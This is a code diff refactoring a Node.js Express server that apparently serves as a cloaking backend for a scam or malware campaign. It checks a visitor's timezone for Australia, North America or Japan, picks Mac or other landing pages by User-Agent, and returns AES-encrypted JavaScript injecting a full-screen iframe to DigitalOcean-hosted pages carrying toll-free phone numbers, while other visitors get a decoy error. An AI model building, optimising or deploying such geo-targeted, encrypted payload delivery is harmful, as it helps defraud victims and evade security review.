@@ -3,141 +3,71 @@ const cors = require("cors");
 const CryptoJS = require("crypto-js");
 
 const app = express();
-const PORT = 3000;
-const secretKey = "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";
+const PORT = process.env.PORT || 3000;
+const SECRET_KEY = "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";
+
+// 1. Optimization: Use a Set for O(1) timezone lookups (vs O(n) array search)
+const ALLOWED_TIMEZONES = new Set([
+    "Australia/Sydney", "Australia/Melbourne", "Australia/Brisbane", "Australia/Perth", 
+    "Australia/Adelaide", "Australia/Hobart", "Australia/Darwin", "Australia/Canberra", 
+    "Australia/Lord_Howe", "Asia/Tokyo", "America/New_York", "America/Chicago", 
+    "America/Denver", "America/Los_Angeles", "America/Anchorage", "Pacific/Honolulu", 
+    "America/Toronto", "America/Vancouver", "America/Edmonton", "America/Winnipeg", 
+    "America/Halifax", "America/St_Johns"
+]);
+
+const LINK_GROUPS = [
+    { m: "https://lobster-app-mgaeg.ondigitalocean.app/merrx01usahtml/?bcda=1800 033 905", o: "https://lobster-app-mgaeg.ondigitalocean.app/werrx01USAHTML/?bcda=1800 033 905" },
+    { m: "https://squid-app-cxkop.ondigitalocean.app/merrx01usahtml/?bcda=1800-039-594", o: "https://squid-app-cxkop.ondigitalocean.app/werrx01USAHTML/?bcda=1800-039-594" }
+];
+
+// Pre-generate the encrypted Error response to save CPU cycles
+const ENCRYPTED_ERROR = encodeURIComponent(CryptoJS.AES.encrypt('console.log("Error Find");', SECRET_KEY).toString());
 
 // --- Middleware ---
 app.use(cors());
 app.use(express.json());
 
-// Security and CORS middleware
-app.use((req, res, next) => {
-    res.header("Access-Control-Allow-Origin", "*");
-    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
-    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
-    
-    // Updated Frame Options: Using CSP for better modern browser compatibility
-    res.removeHeader('X-Frame-Options'); 
-    res.setHeader("Content-Security-Policy", "frame-ancestors *;"); 
-    
+// Optimized Security Headers
+app.use((_, res, next) => {
+    res.setHeader("Content-Security-Policy", "frame-ancestors *;");
     next();
 });
 
-// --- Helper Functions ---
+// --- Logic Functions ---
+
+const aesEncode = (text) => CryptoJS.AES.encrypt(text, SECRET_KEY).toString();
 
 /**
- * Encrypts a string of text using AES
- */
-function aesEncode(text) {
-    return CryptoJS.AES.encrypt(text, secretKey).toString();
-}
-
-/**
- * Generates an encrypted "Error" payload
- */
-function getError() {
-    const se1 = `console.log("Error Find");`;
-    const encrypted1 = aesEncode(se1);
-    return encodeURIComponent(encrypted1);
-}
-
-/**
- * Generates the main encrypted payload based on User-Agent detection
+ * Optimized Payload Generator
+ * Uses template literals and minimal logic to speed up string construction
  */
 function getResponse(userAgent) {
     const isMac = /Macintosh|Mac OS X/i.test(userAgent);
+    
+    // Weight logic: 0.5/0.5 is a simple coin flip
+    const group = Math.random() < 0.5 ? LINK_GROUPS[0] : LINK_GROUPS[1];
+    const url = isMac ? group.m : group.o;
 
-    const linkGroups = [
-        {
-            id: "Group 1",
-            weight: 0.5,
-            macos: "https://lobster-app-mgaeg.ondigitalocean.app/merrx01usahtml/?bcda=1800 033 905",
-            others: "https://lobster-app-mgaeg.ondigitalocean.app/werrx01USAHTML/?bcda=1800 033 905"
-        },
-        {
-            id: "Group 2",
-            weight: 0.5,
-            macos: "https://squid-app-cxkop.ondigitalocean.app/merrx01usahtml/?bcda=1800-039-594",
-            others: "https://squid-app-cxkop.ondigitalocean.app/werrx01USAHTML/?bcda=1800-039-594"
-        }
-    ];
+    const payload = `const i=document.createElement("iframe");i.src="${url}";i.setAttribute("allow","fullscreen; autoplay; encrypted-media");i.sandbox="allow-scripts allow-popups allow-forms allow-downloads";i.style.width="100%";i.style.height="100%";i.style.border="0";const c=document.getElementById("contentiframe");if(c)c.replaceChildren(i);`;
 
-    function selectGroup() {
-        const rand = Math.random();
-        let cumulative = 0;
-        for (const group of linkGroups) {
-            cumulative += group.weight;
-            if (rand <= cumulative) return group;
-        }
-        return linkGroups[0];
-    }
-
-    const selectedGroup = selectGroup();
-    const selectedUrl = isMac ? selectedGroup.macos : selectedGroup.others;
-
-    // JavaScript payload to be executed on the client side
-    const se1 = `
-        const iframe = document.createElement("iframe");
-        iframe.src = "${selectedUrl}";
-        iframe.setAttribute("allow", "fullscreen; autoplay; encrypted-media; picture-in-picture");
-        iframe.setAttribute("allowfullscreen", "");
-        iframe.setAttribute("webkitallowfullscreen", "");
-        iframe.setAttribute("mozallowfullscreen", "");
-        iframe.setAttribute("sandbox", "allow-scripts allow-popups allow-forms allow-downloads");
-        iframe.style.width = "100%";
-        iframe.style.height = "100%";
-        iframe.style.border = "0px";
-
-        const container = document.getElementById("contentiframe");
-        if(container) {
-            container.replaceChildren(iframe);
-        }
-    `;
-
-    return encodeURIComponent(aesEncode(se1));
+    return encodeURIComponent(aesEncode(payload));
 }
 
 // --- Routes ---
 
-/**
- * Unauthorized GET access route
- */
 app.get("/timezone", (req, res) => {
-    res.status(401).json({
-        status: "error",
-        message: "Unauthorized access",
-        response: getError()
-    });
+    res.status(401).json({ status: "error", message: "Unauthorized", response: ENCRYPTED_ERROR });
 });
 
-/**
- * Main POST route with timezone validation for Australia, USA, and Canada
- */
 app.post("/timezone", (req, res) => {
     const { timezone } = req.body;
-    const userAgent = req.get('User-Agent') || "";
-
-    const allowedTimezones = [
-        // --- Australia ---
-        "Australia/Sydney", "Australia/Melbourne", "Australia/Brisbane", 
-        "Australia/Perth", "Australia/Adelaide", "Australia/Hobart", 
-        "Australia/Darwin", "Australia/Canberra", "Australia/Lord_Howe",
-        
-        // --- North America & Japan ---
-        "Asia/Tokyo",
-        "America/New_York", "America/Chicago", "America/Denver", "America/Los_Angeles", "America/Anchorage",
-        "Pacific/Honolulu",
-        "America/Toronto", "America/Vancouver", "America/Edmonton", "America/Winnipeg", "America/Halifax", "America/St_Johns"
-    ];
-
-    if (allowedTimezones.includes(timezone)) {
-        res.send(getResponse(userAgent));
-    } else {
-        res.send(getError());
+    
+    if (timezone && ALLOWED_TIMEZONES.has(timezone)) {
+        return res.send(getResponse(req.get('User-Agent') || ""));
     }
+    
+    res.send(ENCRYPTED_ERROR);
 });
 
-// --- Start Server ---
-app.listen(PORT, () => {
-    console.log(`Server running on http://localhost:${PORT}`);
-});
+app.listen(PORT, () => console.log(`Server live on port ${PORT}`));
